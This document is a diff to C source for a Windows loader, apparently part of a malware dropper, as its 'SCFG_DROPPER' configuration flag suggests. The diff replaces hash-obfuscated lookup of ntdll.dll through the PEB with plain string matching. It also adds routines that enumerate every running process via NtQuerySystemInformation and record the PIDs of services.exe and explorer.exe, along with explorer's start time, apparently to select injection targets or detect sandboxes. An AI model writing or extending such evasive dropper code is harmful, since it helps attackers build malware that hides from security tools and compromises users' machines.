@@ -1,21 +1,23 @@
 #include <ldr.h>
 #include <config.h>
 #include <fnv1a.h>
+#include <ntapi.h>
 #include "ntapi\ntapi.h"
 
 HMODULE
 DECLSPEC_NOINLINE
 LdrGetModule(
-    IN DWORD dwModuleNameHash
+    IN PWSTR szModuleName,
+    IN SIZE_T cbModuleName
     )
 {
     PPEB Peb = RtlpGetPeb();
     PLDR_DATA_TABLE_ENTRY Index = (PVOID)((PPEB_LDR_DATA)Peb->Ldr)->InLoadOrderModuleList.Flink;
-    PLDR_DATA_TABLE_ENTRY End   = Index;
+    PLDR_DATA_TABLE_ENTRY End = Index;
 
     do {
-        if (Index->BaseDllName.Length) {
-            if (Fnv1AHashStringW(Index->BaseDllName.Buffer) == dwModuleNameHash) {
+        if (Index->BaseDllName.Length == cbModuleName) {
+            if (RtlpCompareUnicodeNZ(Index->BaseDllName.Buffer, szModuleName, cbModuleName)) {
                 return (HMODULE)Index->DllBase;
             }
         }
@@ -72,17 +74,13 @@ LdrGetProcAddressEx(
     return dwProcFound;
 }
 
-enum {
-    HASH_NTDLL_KEY    = RTLP_LCG_DWORD,
-    HASH_NTDLLALT_KEY = RTLP_LCG_DWORD,
-};
-
-static CONST VOLATILE DWORD NtdllNameSum    = 0xA62A3B3B ^ HASH_NTDLL_KEY;    // ntdll.dll
-static CONST VOLATILE DWORD NtdllNameSumAlt = 0x145370BB ^ HASH_NTDLLALT_KEY; // NTDLL.DLL
-
 BOOL
 LdrLoadNtapi(VOID)
 {
+    enum {
+        cbNtdllDll = 18,
+    };
+
     $DLOG1(DLG_FLT_INFO, "Loading NTAPI");
 
 #if SCFG_DROPPER_NTAPI_INIT_USE_SYSCALLS == ON
@@ -94,9 +92,9 @@ LdrLoadNtapi(VOID)
 #endif
         HMODULE hModule;
 
-        if (IS_NULL(hModule = LdrGetModule(NtdllNameSum ^ HASH_NTDLL_KEY))) {
+        if (IS_NULL(hModule = LdrGetModule(L"ntdll.dll", cbNtdllDll))) {
             /* For future versions, you never know */
-            if (IS_NULL(hModule = LdrGetModule(NtdllNameSumAlt ^ HASH_NTDLLALT_KEY))) {
+            if (IS_NULL(hModule = LdrGetModule(L"NTDLL.DLL", cbNtdllDll))) {
                 $DLOG1(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");
 
                 return FALSE;
@@ -137,4 +135,89 @@ LdrLoadNtapi(VOID)
     $DLOG2(DLG_FLT_INFO, "Done");
 
     return TRUE;
+}
+
+BOOL
+LdrQueryAllProcesses(
+    OUT PSYSTEM_PROCESS_INFORMATION* ProcessesList
+    )
+{
+    $DLOG1(DLG_FLT_INFO, "Querying all processes");
+
+    SIZE_T cbBlock = 0;
+    PVOID Block = NULL;
+
+    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, (PVOID)&cbBlock);
+
+    if (!cbBlock) { // This should never fail
+        $DLOG1(DLG_FLT_CRITICAL, "NtQuerySystemInformation expects 0 bytes buffer");
+
+        return FALSE;
+    }
+
+    if (NT_ERROR(NtAllocateVirtualMemory(NtCurrentProcess(), &Block, 0, &cbBlock, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+        $DLOG1(DLG_FLT_CRITICAL, "Can't allocate %lu bytes", cbBlock);
+
+        return FALSE;
+    }
+
+    if (NT_ERROR(NtQuerySystemInformation(SystemProcessInformation, Block, cbBlock, (PVOID)&cbBlock))) {
+        $DLOG1(DLG_FLT_CRITICAL, "NtQuerySystemInformation failed");
+
+        return FALSE;
+    }
+
+    *ProcessesList = Block;
+
+    $DLOG2(DLG_FLT_INFO, "Done");
+
+    return TRUE;
+}
+
+BOOL
+LdrCreateOptimalProcessFilter(
+    IN  PSYSTEM_PROCESS_INFORMATION ProcessesList,
+    OUT PPROCESSESFILTER Filter
+    )
+{
+    enum {
+        cbExplorer = 24,
+        cbServices = 24
+    };
+
+    $DLOG1(DLG_FLT_INFO, "Gathering infromation for optimal filter");
+
+    ULONG dwFound = 0;
+
+    for (PSYSTEM_PROCESS_INFORMATION Index = ProcessesList; Index->NextEntryOffset; Index = (PVOID)((ULONG_PTR)Index + Index->NextEntryOffset)) {
+        if (!Index->ImageName.Length){
+            continue;
+        }
+
+        if (RtlpCompareUnicodeNZ(Index->ImageName.Buffer, L"services.exe", cbServices)) {
+            Filter->ServicePid = Index->UniqueProcessId;
+
+            if (++dwFound == 2) {
+                break;
+            }
+        } else if (RtlpCompareUnicodeNZ(Index->ImageName.Buffer, L"explorer.exe", cbExplorer)) {
+            Filter->ExplorerPid = Index->UniqueProcessId;
+            Filter->qwExplorerStartTime = Index->CreateTime.QuadPart;
+
+            if (++dwFound == 2) {
+                break;
+            }
+        }
+    }
+
+    if (dwFound == 2) {
+        $DLOG2(DLG_FLT_DEFAULT, "Services PID : %p",    Filter->ServicePid);
+        $DLOG2(DLG_FLT_DEFAULT, "Explorer PID : %p",    Filter->ExplorerPid);
+        $DLOG2(DLG_FLT_DEFAULT, "Explorer Time: %I64lu", Filter->qwExplorerStartTime);
+        $DLOG2(DLG_FLT_INFO,    "Done");
+    } else {
+        $DLOG1(DLG_FLT_CRITICAL, "Failed");
+    }
+
+    return (dwFound == 2);
 }
